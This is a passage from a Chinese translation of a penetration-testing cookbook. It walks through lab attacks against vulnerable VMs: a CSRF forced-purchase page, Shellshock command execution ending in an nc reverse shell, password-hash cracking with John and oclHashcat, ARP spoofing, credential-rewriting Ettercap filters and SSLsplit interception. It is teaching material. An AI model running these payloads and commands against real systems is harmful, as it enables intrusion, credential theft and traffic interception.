8.  现在，攻击者需要上传图片来强迫其它用户购买。登录为`attacker`之后，访问`Upload`，填充所需信息，选项需要上传的文件，点击`UploadFile`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-6-2.jpg)
    
    一旦图片呗上传，我们会直接重定向到它的相应页面，你可以在这里看到：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-6-3.jpg)
    
    要注意为图片分配的 ID，它是攻击的核心部分，这里它是 16。
    
9.  一旦我们分析了购买流程，并拥有了图片 ID，我们需要启动托管恶意页面的服务器。在 Kali 中以 root 用户启动 Apache 服务器，像这样：

    ```
    service apache2 start 
    ```
    
0.  之后，创建 HTML 文件，叫做`/var/www/html/wackopurchase.html`，带有如下内容：

    ```html
    <html> 
    <head></head> 
    <body onLoad='window.location="http://192.168.56.102/ WackoPicko/cart/action.php?action=purchase";setTimeout("window. close;",1000)'> 
    <h1>Error 404: Not found</h1> 
    <iframe src="http://192.168.56.102/WackoPicko/cart/action. php?action=add&picid=16"> 
    <iframe src="http://192.168.56.102/WackoPicko/cart/review.php" > 
    <iframe src="http://192.168.56.102/WackoPicko/cart/confirm.php"> 
    </iframe> 
    </iframe> 
    </iframe> 
    </body>
    ```
    
    这个代码会我们的商品的发送`add`、`review`和`confirm`请求给 WackoPicko ，之后展示 404 页面给用户，当它加载完成后，它会重定向到购买操作，之后在一秒后关闭窗口。
    
1.  现在以`v_user`登录，上传图片并登出。

2.  作为攻击者，我们需要确保用户访问我们的恶意站点，同时仍然保持登录 WackoPicko。以`attacker`登录之后，访问`Recent`并选择属于`v_user`的图片（刚刚上传的那个）。

3.  我们需要在图片上输入下列评论。

    ```html
    This image looks a lot like <a href="http://192.168.56.1/ wackopurchase.html" target="_blank">this</a>
    ```
    
    > 译者注：这一步的前提是页面上存在 XSS，没有的话利用社会工程直接发送链接也是可行的。
    
4.  点击`Preview`之后`Create`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-6-4.jpg)
    
    你可以看到，评论中允许 HTML 代码，而且当`v_user`点击链接是，我们的恶意页面会在新窗口打开。
    
5.  登出并以`v_user`登录。

6.  访问`Home`并点击` Your Purchased Pics`，这里应该没有攻击者的图片。

7.  再次访问`Home`，之后访问` Your Uploaded Pics`。

8.  选项带有攻击者评论的图片。

9.  点击评论中的链接。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-6-5.jpg)
    
    当它完全加载之后，你应该看到文本框中的一些 WackoPicko  的文本，这个窗口会在一秒之后关闭，我们的攻击已经完成了。
    
0.  如果我们访问`Home`，你可以看到`v_user`的 Tradebux 余额现在是 85。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-6-6.jpg)

1.  现在访问`Your Purchased Pics`：` http://192.168.56.102/WackoPicko/ pictures/purchased.php `来查看非预期购买的图片：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-6-5.jpg)
    
对于 CSRF 工具者，成功执行漏洞需要预置条件。首先，我们需要了解执行特殊操作所需的请求参数，以及我们需要在所有情况中都处理的响应。

这个秘籍中，我们使用了代理和有效用户账户来执行我们所需的操作，来复制和收集所需信息：购买过程中涉及到的请求，这些请求所需的信息，以及执行它们的正确顺序。

一旦我们知道了需要向应用发送什么，我们需要将其自动化，所以我们启动 Web 服务器，并准备页面使调用以正确顺序和正确参数执行。通过使用 `onLoad` JS 时间，我们确保购买在`add`和`confirm`调用之前不会执行。

在每个 CSRF 攻击中，都必须有方法让用户访问我们的恶意站点，同时保持正常站点的登录。这个秘籍中，我们使用应用的特性，它的评论允许 HTML 代码，并可以在这里输入链接。所以当用户点击某个图片评论中的链接时，它就向我们的 Tradebox 盗取站点发送了请求。

最后，当用户访问我们的站点时，它模拟了错误页面，并在购买请求刚刚完成后关闭自己。在这里我们并不需要担心渗透，所以错误页面可以改进一下使用户不怀疑它。这通过 HTML `body`标签中的`onload`事件中的 JavaScript 命令（购买操作的调用，和用于关闭窗口的计时器）来完成。这个时间在页面的所有元素完全加载之后触发，换句话说，当`add`、`review`和`confirm`的步骤完成之后。

## 7.7 使用 Shellsock 执行命令

Shellshock（也叫作 Bashdoor）是个在 2014 年九月发现在 Bash shell 中的 bug，允许命令通过储存在环境变量中的函数来执行。

Shellshock 和我们渗透测试者有关系，因为开发者有时候允许我们在 PHP 或 CGI 脚本中调用系统命令 -- 这些脚本可以利用系统环境变量。

这个秘籍中，我们会在 Bee-box 漏洞虚拟机中利用 Shellshock 漏洞来获得服务器的命令执行权。

### 操作步骤

1.  登录` http://192.168.56.103/bWAPP/`。

2.  在`Choose your bug`下拉框中选择` Shellshock Vulnerability (CGI) `，之后点击`Hack`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-7-1.jpg)

    在文本中，我们看到了一些有趣的东西；`Current user: www-data`。这可能意味着页面使用系统调用来获得用户名。它给了我们提示：`Attack the referrer`。

3.  让我们看看背后有什么东西，使用 BurpSuite 来记录请求并重复步骤 2。

4.  让我们查看代理的历史：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-7-2.jpg)
    
    我们可以看到，有个`iframe`调用了 shell 脚本：`./cgi-bin/shellshock.sh`，这可能存在 Shellshock 漏洞。
    
5.  让我们跟随提示并尝试攻击`shellshock.sh`。所以我们首先需要配置 BurpSuite 来拦截服务器的响应，访问`Proxy`标签页的`Options`，并选中`Intercept responses based on the following rules`的选择框。

6.  现在，让 BurpSuite 拦截和重新加载`shellshock.php`。

7.  在 BurpSuite 中，点击`Forward`直到得到了`/bWAPP/cgi-bin/ shellshock.sh`请求，之后将`Referer`替换为：

    ```sh
    () { :;}; echo "Vulnerable:"
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-7-3.jpg)
    
8.  再次点击`Forward`，在`.ttf`文件的请求中，我们应该能得到`shellshcok.sh`的响应，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-7-4.jpg)
    
    现在响应多了一个协议头参数，叫做`Vulnerable`。这是因为它将`echo`命令的输出集成到 HTTP 协议头中，所以我们可以进一步利用它。
    
9.  现在使用下列命令重复这个过程：

    ```
    () { :;}; echo "Vulnerable:" $(/bin/sh -c "/sbin/ifconfig")
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-7-5.jpg)
    
0.  能够在远程服务器上执行命令，对于渗透测试来说是个巨大的优势，下一步自然是获得远程 shell。在 Kali 中打开终端，监听网络端口，像这样：

    ```
    nc -vlp 12345
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-7-6.jpg)
    
1.  现在访问 BurpSuite 的代理历史，选择任何`shellshock.sh`的请求，右击它并发送到 Repeater，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-7-7.jpg)
    
2.  在 Repeater 中，修改 Referer 的值为：

    ```
    () { :;}; echo "Vulnerable:" $(/bin/sh -c "nc -e /bin/bash 192.168.56.1 12345")
    ```
    
    这里，192.168.56.1 是我们 Kali 主机的地址。
    
3.  点击`Go`。

4.  如果我们检查我们的终端，我们可以看到连接已建立，执行一些命令来检查我们是否得到了远程 shell。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-7-8.jpg)
    
### 工作原理

在第一步中，我们发现了 shell 脚本的调用。因为它可以被 shell 解释器运行，它可能是漏洞版本的 bash。为了验证，我们执行了下列测试：

```sh
() { :;}; echo "Vulnerable:" 
```

第一个部分`() { :;};`是个空函数，因为 bash 可以将函数储存为环境变量，这个是漏洞的核心。在函数结束之后，解析器会继续解释（并执行）命令，这允许我们执行第二个部分`echo "Vulnerable:`，这是简单返回输入的命令。

Web 服务器中存在漏洞，因为 CGI 事先将请求的所有部分映射为环境变量，所以这个攻击通过`User-Agent`或者`Accept-Language`也能工作。

一旦我们知道了服务器存在漏洞，我们键入测试命令`ifconfig`并建立反向 shell`。

反向 shell 是一种远程 shell，它的特点是由受害者主机初始化，攻击者监听连接，而不是服务器在绑定连接中等待客户端的连接。

## 7.8 使用 John the Ripper 和字典来破解密码哈希

在上一个秘籍，以及第六章中，我们从数据库中提取了密码哈希。在执行渗透测试的时候，有时候这是唯一的用于发现密码的方式。为了发现真实的密码，我们需要破译它们。由于哈希由不可逆的函数生成，我们没有办法直接解密密码。所以使用慢速的方法，例如暴力破解和字典攻击就很有必要。

这个秘籍中，我们会使用 John the Ripper（JTR 或 John），最流行的密码破解器，从第六章“逐步执行基本的 SQL 注入”秘籍中提取的哈希中恢复密码。

### 操作步骤

1.  虽然 JTR 对接受的输入非常灵活，为了防止错误解释，我们首先需要以特定格式设置用户名和密码哈希。创建叫做`hashes_6_7.txt`的文本文件，每行包含一个名称和一个哈希，以冒号分隔（`username:hash`），像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-8-1.jpg)
    
2.  一旦我们拥有了这个文件，我们可以打开终端并执行下列命令：

    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes_6_7.txt
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-8-2.jpg)
    
    我们使用 Kali 预置的单词列表之一。我们可以看到单词列表中六个密码发现了五个，我们也能发现，John 每秒能比较 10,336,000 次（10,336 KC/s）。
    
3.  John 也有选项来应用修改器规则 -- 添加前后缀，修改大小写，以及在每个密码上使用 leetspeak。让我们在仍然未破解的密码上尝试它们：

    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes_6_7.txt –rules
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-8-3.jpg)

    我们可以看到这个规则生效了，我们得到了最后一个密码。
    
### 工作原理

John（以及任何离线密码破解器）的工作方式是计算列表（或所生成的）单词的哈希，并将它们与需要被破解的哈希对比，当存在匹配时，它就假设密码找到了。

第一个命令使用`--wordlist`选项告诉 John 要使用什么单词。如果忽略了它，它会生成自己的列表来执行爆破攻击。`--format`选项告诉我们要使用什么算法来生成哈希，如果这个选项被忽略，John 会猜测它，通常带有不错的结果。最后，我们将包含想要破解的哈希的文件传入。
    
3.  我们可以通过使用`--rules`选项来增加找到密码的机会，因为在尝试创建更强的密码来破解的时候，它会使用人们对单词所做的常用修改。例如，对于`password`，John 也会尝试下面的东西：

+ `Password` 
+ `PASSWORD` 
+ `password123` 
+ `Pa$$w0rd`

## 7.9 使用 oclHashcat/cudaHashcat 爆破密码哈希

最近，显卡的发展取得了巨大突破，这种芯片中含有成百上千个处理器，它们都并行工作。这里，当应用在密码破解上是，这意味着，如果单个处理每秒可以计算一万个哈希，一个带有上千内核的 GPU 就能够计算一千万个。这可以将破解时间降至一千分之一。

现在我们使用 Hashcat 的 GPU 版本来爆破密码。如果你在 N 卡的电脑上安装的 Kali，你需要 cudeHashcat。如果它安装在 A 卡的电脑上，则需要 oclHashcat。如果你在虚拟机上安装 kali，GPU 破解可能不工作，但是你始终可以在你的主机上安装它，Windows 和 Linux 上都有它的版本。

这个秘籍中，我们会使用 oclHashcat，它和 cudaHashcat 的命令没有区别，虽然 A 卡对于密码破解更加高效。

### 准备

我们需要确保你正确安装了显卡驱动，oclHashcat 也兼容它们，所以你需要做这些事情：

1.  单独运行 oclHashcat，如果出现问题它会告诉你。

    ```
    oclhashcat 
    ```

2.  测试它在跑分模式中支持的每种算法的哈希率。

    ```
    oclhashcat --benchmark 
    ```
    
3.  取决于你的安装，oclHahcat 可能需要在你的特定显卡上强行工作：

    ```
    oclhashcat --benchmark --force
    ```
    
我们会使用上一个秘籍的相同哈希文件。

Kali 默认安装的 oclHashcat 上有一些问题，所以如果你在运行 oclHashcat 的时候出现了问题，你始终可以从官网上下载最新版本，并从你解压的地方直接运行（`http://hashcat.net/ oclhashcat/`）。

### 操作步骤

1.  我们首先破解单个哈希，让我们试试`admin`的哈希：

    ```
    oclhashcat -m 0 -a 3 21232f297a57a5a743894a0e4a801fc3
    ```

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-9-1.jpg)
    
    你可以看到，我们能够直接从命令行中设置哈希，它会在一秒之内破解出来。
    
2.  现在，为了破解整个文件，我们需要去掉用户名，只保留哈希，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-9-2.jpg)
    
    我们创建了只包含哈希的新文件。
    
3.  为了破解文件中的哈希，我们只需要在上一条命令中将哈希替换为文件名称。

    ```
    oclhashcat -m 0 -a 3 hashes_only_6_7.txt
    ```

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/7-9-3.jpg)

    你可以看到，它在三分钟之内涵盖了一到七个字符的所有组合（每秒破解 6.885 亿个哈希）。并且它需要花费多于两个小时来测试八个字符的所有组合。这对于爆破来说十分有效。
    
### 工作原理

在这个秘籍中，我们用于执行`oclHahcat`的参数定义了要使用的哈希算法：`-m 0`告诉程序使用 MD5 来计算所生成单词的哈希，以及攻击类型，`-a 3`的意思是我们打算使用纯爆破攻击，并尝试所有可能的字符组合，直到发现了密码。最后，我们在第一种情况中添加了我们打算破解的哈希，第二种情况中我们添加了包含哈希集合的文件。

oclHahcat 也可以使用字典文件来执行混合攻击（爆破加上字典）来定义要测试哪个字符集，并将结果保存到指定文件中（`/usr/share/oclhashcat/oclHashcat.pot`）。他也可以对单词应用规则，并使用统计模型（马尔科夫链）来增加破解效率。使用`--help`命令来查看所有选项，像这样：

```
oclhashcat --help
```


# 第八章：中间人攻击

> 作者：Gilberto Najera-Gutierrez

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

中间人（MITM）攻击是一种攻击类型，其中攻击者将它自己放到两方之间，通常是客户端和服务端通信线路的中间。这可以通过破坏原始频道之后拦截一方的消息并将它们转发（有时会有改变）给另一方来实现。

让我们观察下面这个例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-0-1.jpg)

Alice 连接到了 Web 服务器上，Bob 打算了解 Alice 正在发送什么信息。于是 Bob 建立 MITM 攻击，通过告诉服务器他是 Alice，并且告诉 Alice 他是服务器。现在，所有 Alice 的请求都会发给 Bob，Bob 会将它们转发给服务器，并对服务器的响应做相同操作。这样，Bob 就能够拦截、读取或修改所有 Alice 和服务器之间的流量。

虽然 MITM 攻击并不特定与 Web 攻击，了解如何执行它们，以及如何防止它们，对于任何渗透测试者都非常重要，因为它们可以用于偷取密码，劫持会话，或者执行 Web 应用中的非授权操作。

这一章中，我们会建立起中间人攻击，并使用它来获得信息，以及执行更加复杂的攻击。

## 8.1 使用 Ettercap 执行欺骗攻击

地址解析协议（ARP）欺骗可能是最常见的 MITM 攻击。它基于一个事实，就是 ARP 并不验证系统所收到的响应。这就意味着，当 Alice 的电脑询问网络上的所有设备，“IP 为 xxx.xxx.xxx.xxx 的机器的 MAC 地址是什么”时，它会信任从任何设备得到的答复。该设备可能是预期的服务器，也可能是不是。ARP 欺骗或毒化的工作方式是，发送大量 ARP 响应给通信的两端，告诉每一端攻击者的 MAC 地址对应它们另一端的 IP 地址。

这个秘籍中，我们会使用 Ettercap 来执行 ARP 欺骗攻击，并将我们放到客户端和服务器之间。

### 准备

对于这个秘籍，我们会使用第一章配置的客户端虚拟机，和 vulnerable_vm。客户端的 IP 是 192.168.56.101，vulnerable_vm 是 192.168.56.102。

### 操作步骤

1.  将两个虚拟机打开，我们的 Kali Linux（192.168.56.1）主机是攻击者的机器。打开终端窗口并输入下列命令：

    ```
    ettercap –G 
    ```
    
    从 Ettercap 的主菜单中，选择`Sniff | Unified Sniffing`。
    
2.  在弹出的对话框中选择你打算使用的网络接口，这里我们选择`vboxnet0`，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-1-1.jpg)
    
3.  既然我们嗅探了网络，下一步就是识别哪个主机正在通信。访问主菜单的`Hosts`之后选择`Scan for hosts`。

4.  从我们发现的主机中，选择我们的目标。从`Hosts `菜单栏中选择`Hosts list`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-1-2.jpg)
    
5.  从列表中选择`192.168.56.101`，并点击`Add to Target 1`。

6.  之后选择`192.168.56.102 `，之后点击`Add to Target 2`。

7.  现在我们检查目标：在`Targets`菜单中，选择` Current targets`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-1-3.jpg)

8.  我们现在准备好了开始欺骗攻击，我们的位置在服务器和客户端中间，在`Mitm `菜单中，选择`ARP poisoning`。

9.  在弹出的窗口中，选中`Sniff remote connections`，然后点击`OK`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-1-4.jpg)

这就结束了，我们现在可以看到在客户端和服务端之间的流量。

### 工作原理

在我们键入的第一个命令中，我们告诉 Ettercap 启动 GTK 界面。

> 其它界面选项为`-T`启动文本界面，`-C`启动光标（以 ASCII 文本），`-D`运行为守护进程，没有界面。

之后，我们启动了 Ettercap 的嗅探功能。统一模式意味着我们会通过单一网络接口接受并发送信息。当我们的目标通过不同网络接口到达时，我们选择桥接模式。例如，如果我们拥有两个网卡，并且通过其一连接到客户端，另一个连接到服务端。

在嗅探开始之后，我们选择了目标。

> 事先选择你的目标

> 单次攻击中，选择唯一必要主机作为目标非常重要，因为毒化攻击会生成大量网络流量，并导致所有主机的性能问题。在开始 MITM 攻击之前，弄清楚那两个系统会成为目标，并仅仅欺骗这两个系统。

一旦设置了目标，我们就可以开始 ARP 毒化攻击。`Sniffing remote connections`意味着 Ettercap 会捕获和读取所有两端之间的封包，`Only poison one way`在我们仅仅打算毒化客户端，而并不打算了解来自服务器或网关的请求时（或者它拥有任何对 ARP 毒化的保护时）非常实用。

## 8.2 使用 Wireshark 执行 MITM 以及捕获流量

Ettercap 可以检测到经过它传播的相关信息，例如密码。但是，在渗透测试的时候，它通常不足以拦截一些整数，我们可能要寻找其他信息，类似信用卡的号码，社会安全号码，名称，图片或者文档。拥有一个可以监听网络上所有流量的工具十分实用，以便我们保存和之后分析它们。这个工具是个嗅探器，最符合我们的目的的工具就是 Wireshark，它包含于 Kali Linux。

这个秘籍中，我们会使用 Wireshark 来捕获所有在客户端和服务端之间发送的封包来获取信息。

### 准备

在开始之前我们需要让 MITM 工作。

### 操作步骤

1.  从 Kali `Applications`菜单的`Sniffing & Spoofing`启动 Wireshark，或者从终端中执行：

    ```
    wireshark 
    ```
    
2.  当 Wireshark 加载之后，选项你打算用于捕获封包的网卡。我们这里选择`vboxnet0`，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-2-1.jpg)
    
3.  之后点击`Start`。你会立即看到 Wireshark 正在捕获 ARP 封包，这就是我们的攻击。


    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-2-2.jpg)
    
4.  现在，来到客户端虚拟机，浏览`http://192.168.56.102/ dvwa`，并登陆 DVWA。

5.  在 Wireshark 中的`info `区域中，查找来自`192.168.56.101`到`192.168.56.102`，带有 POST `/dvwa/login.php` 的 HTTP 封包。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-2-3.jpg)
    
    如果我们浏览所有捕获的封包，我们会看到一个封包对应授权，并会看到我们可以以纯文本获得用户名和密码。
    
    > 使用过滤器
    
    > 我们可以在 Wireshark 中使用过滤器来只展示我们感兴趣的封包。例如，为了只查看 登录页面的 HTTP 请求，我们可以使用：`http. request.uri contains "login"`。
    
    如果我们查看 Ettercap 的窗口，我们也能看到用户名和密码，像这样：
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-2-4.jpg)
    
    通过捕获客户端和服务端之间的流量，攻击者能够提取和利用所有类型的敏感信息，例如用户名、密码、会话 Cookie、账户号码、信用卡号码、私人邮件，以及其它。
    
### 工作原理

Wireshark 监听每个我们选择监听的接口上的封包，并在它的界面中显示。我们可以选择监听多个接口。

当我们首先启动嗅探的时候，我们了解了 ARP 欺骗如何工作。它发送大量 ARP 封包给客户端和服务端，以便防止它们的地址解析表（ARP 表）从正当的主机获得正确的值。

最后，当我们向服务器发送请求时，我们看到了 Wireshark 如何捕获所有包含在请求中的信息，包含协议、来源和目的地 IP。更重要的是，它包含了由客户端发送的数据，其中包含管理员密码。

### 另见

研究 Wireshark 数据有一些无聊，所以了解如何在捕获封包时使用显示过滤器非常重要。你可以访问下列站点来了解更多信息。

+ https://www.wireshark.org/docs/wsug_html_chunked/ChWorkDisplayFilterSection.html
+ https://wiki.wireshark.org/DisplayFilters

使用 Wireshark，你可以通过捕获过滤器来选择捕获哪种数据。这是非常实用的特性，尤其是执行 MITM 攻击时生成大量流量的时候。你可以从下列站点中阅读更多信息。

+ https://www.wireshark.org/docs/wsug_html_chunked/ChCapCaptureFilterSection.html
+ https://wiki.wireshark.org/CaptureFilters

## 8.3 修改服务端和客户端之间的数据

在执行 MITM 攻击时，我们不仅仅能够监听在受害者系统之间发送的任何数据，也能够修改请求和响应，因而按照我们的意图调整它们的行为。

这个秘籍中，我们会使用 Ettercap 过滤器来检测封包是否包含我们感兴趣的信息，并触发改变后的操作。

### 准备

在开始之前我们需要让 MITM 工作。

### 操作步骤

1.  我们的第一步是创建过滤器文件。将下列代码保存到文本文件中（我们命名为`regex-replace-filter.filter`）:

    ```
    # If the packet goes to vulnerable_vm on TCP port 80 (HTTP) 
    if (ip.dst == '192.168.56.102'&& tcp.dst == 80) {
        # if the packet's data contains a login page    
        if (search(DATA.data, "POST")){        
            msg("POST request");        
            if (search(DATA.data, "login.php") ){
                msg("Call to login page");            
                # Will change content's length to prevent server from failing            
                pcre_regex(DATA.data, "Content-Length\:\ [0-9]*","Content-Length: 41");            
                msg("Content Length modified");            
                # will replace any username by "admin" using a regular expression            
                if (pcre_regex(DATA.data, "username=[a-zAZ]*&","username=admin&"))    {
                    msg("DATA modified\n");              
                }            
                msg("Filter Ran.\n");        
            }    
        } 
    }
    ```
    
    > `#` 符号使注释。这个语法非常类似于 C，除了注释和一些不同。
    
2.  下面我们需要为 Ettercap 编译过滤器来使用它。从终端中，执行下列命令。

    ```
    etterfilter -o regex-replace-filter.ef regex-replace-filter.filter
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-3-1.jpg)
    
3.  现在，从 Ettercap 的菜单中，选择`Filters | Load a filter`，后面是`regexreplace-filter.ef`，并点击`Open`。

    我们会看到 Ettercap 的日志窗口中出现新的条目，表明新的过滤器已经加载了。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-3-2.jpg
    
4.  在客户端中，浏览` http://192.168.56.102/dvwa/ `并使用密码`admin`登陆任意用户，例如：`inexistentuser: admin`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-3-3.jpg)
    
    用户现在登陆为管理员，并且攻击者拥有了对两个用户都生效的密码。)
    
5.  如果我们检查 Ettercap 的日志，我们可以看到我们编写在代码中的消息会出现在这里，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-3-4.jpg)
    
### 工作原理

ARP 欺骗攻击是更加复杂的攻击的开始。这个秘籍中，我们使用了 Ettercap 的封包过滤功能来识别带有特定内容的封包，并修改它来强制让用户以管理员登录应用。这也可以从服务端到客户端来完成，可以用来通过展示一些伪造信息来欺骗用户。

我们的第一步是创建过滤脚本，它首先检查被分析的封包是否含有我们打算改变的信息，像这样：

```
if (ip.dst == '192.168.56.102'&& tcp.dst == 80) { 
```

如果目标 IP 是  vulnerable_vm 之一，且 TCP 端口是 80（默认 HTTP 端口号），它就是发往我们打算拦截的服务器的请求。

```
if (search(DATA.data, "POST")){    
    msg("POST request");    
    if (search(DATA.data, "login.php") ){
```

如果请求使用 POST 方法，且去往`login.php`页面，它就是登录尝试，因为这是我们的目标应用接收登录尝试的方式。

```
pcre_regex(DATA.data, "Content-Length\:\ [0-9]*","Content-Length: 41");
```

我们使用正则表达式来获取请求中的`Content-Length`参数，并将它的值改为 41，这是我们发送带有`admin/admin`凭证的登录封包的长度。

```
if (pcre_regex(DATA.data, "username=[a-zA-Z]*&","username=admin&")){    
    msg("DATA modified\n");  
} 
```

同样，使用正则表达式，我们在请求中查找用户名称值，并将它替换为`admin`。

消息（`msg`）仅仅用于跟踪和调试目的，可以被从脚本中忽略。

在编写完脚本之后，我们使用 Ettercap 的 etterfilter 编译他，以便执行它。之后，我们在 Ettercap 中加载它，然后等待客户端连接。

## 8.4 发起 SSL MITM 攻击

如果我们使用我们目前的方法嗅探 HTTPS 会话，我们不能从中得到很多信息，因为所有通信都是加密的。

为了拦截、读取和修改 SSL 和 TLS 的连接，我们需要做一系列准备步骤，来建立我们的 SSL 代理。SSLsplit 的仿作方式是使用两个证书，一个用于告诉服务器这是客户端，以便它可以接收和解密服务器的响应，另一个告诉客户端这是服务器。对于第二个证书，如果我们打算代替一个拥有自己的域名的网站，并且它的证书由认证中心（CA）签发，我们就需要让 CA 为我们签发根证书，但因为我们是攻击者，我们就需要自己来做。

这个秘籍中，我们会配置我们自己的 CA，以及一些 IP 转发规则来执行 SSL 中间人攻击。

### 操作步骤

1.  首先，我们打算在 Kali 上创建 CA 私钥，所以在 root 终端中键入下列命令：

    ```
    openssl genrsa -out certaauth.key 4096 
    ```
    
2.  现在让我们创建一个使用这个密钥签名的证书：

    ```
    openssl req -new -x509 -days 365 -key certauth.key -out ca.crt 
    ```
    
3.  填充所需信息（或者仅仅对每个字段按下回车）。

4.  下面，我们需要开启 IP 转发来开启系统的路由功能（将目标不是本地主机的 IP 包转发到网关）：

    ```
    echo 1 > /proc/sys/net/ipv4/ip_forwar
    ```
    
5.  现在我们打算配置一些会泽来防止转发任何东西。首先，让我们检查我们的 iptables 的`nat`表中是否有任何东西：

    ```
    iptables -t nat -L
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-4-1.jpg)
    
6.  如果有东西，你可能打算备份一下，因为我们会刷新它们，如下：

    ```
    iptables -t nat -L > iptables.nat.bkp.txt 
    ```
    
7.  现在让我们刷新整个表。

    ```
    iptables -t nat -F
    ```
    
8.  之后我们建立 PREROUTING 规则：

    ```
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --toports 8080 
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --toports 8443 
    ```
    
现在我们已经准备好嗅探加密连接。

### 工作原理

这个秘籍中，我们配置了 Kali 主机来充当 CA，这意味着它可以校验 SSLsplit 使用的证书。在前两步中，我们仅仅创建了私钥，和使用私钥签名的证书。

下面，我们建立了端口转发规则。我们首先开启了转发选项，之后创建了 iptables 规则来将 80 端口的请求转发到 443（HTTP 到 HTTPS）。这是为了重定向请求。我们的 MITM 攻击会拦截 SSLsplit，便于它使用一个证书来解密收到的消息、处理它，使用另一个证书加密并发送到目的地。

### 另见

你应该了解更多加密证书以及 SSL 和 TLS 协议，还有 SSLsplit，可以访问这里：

+ https://en.wikipedia.org/wiki/Public_key_certificate 
+ https://www.roe.ch/SSLsplit 
+ https://en.wikipedia.org/wiki/Iptables 
+ `man iptables`

## 8.5 使用 SSLsplit 获得 SSL 数据

在之前的密集中，我们准备了环境来攻击 SSL/TLS 连接。而这个秘籍中，我们会使用 SSLsplit 来完成 MITM 攻击并从加密连接中提取信息。

### 准备

我们需要在开始秘籍之前执行 ARP 欺骗攻击，并成功完成了上一个秘籍。

### 操作步骤

1.  首先，我们需要创建目录，其中 SSLsplit 在里面存放日志。打开终端并创建两个目录，像这样：

    ```
    mkdir /tmp/sslsplit 
    mkdir /tmp/sslsplit/logdir
    ```
    
2.  现在，让我们启动 SSLSplit：

    ```
    sslsplit -D -l connections.log -j /tmp/sslsplit -S logdir -k certauth.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-5-1.jpg)
    
3.  现在，SSLSplit 正在运行，Windows 客户端和 vulnerable_vm 之间存在 MITM，来到客户端并访问` https://192.168.56.102/dvwa/`。

4.  浏览器会要求确认，因为我们的 CA 和证书并不是被任何浏览器官方承认的。设置例外并继续。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-5-2.jpg)
    
5.  现在登录 DVWA ，使用管理员用户和密码。

6.  让我们看看 SSLSplit 中发生了什么。打开新的终端并检查日志内容，在我们为 SSLSplit 创建的目录中：

    ```
    ls /tmp/sslsplit/logdir/ 
    cat /tmp/sslsplit/logdir/*
    ```
    
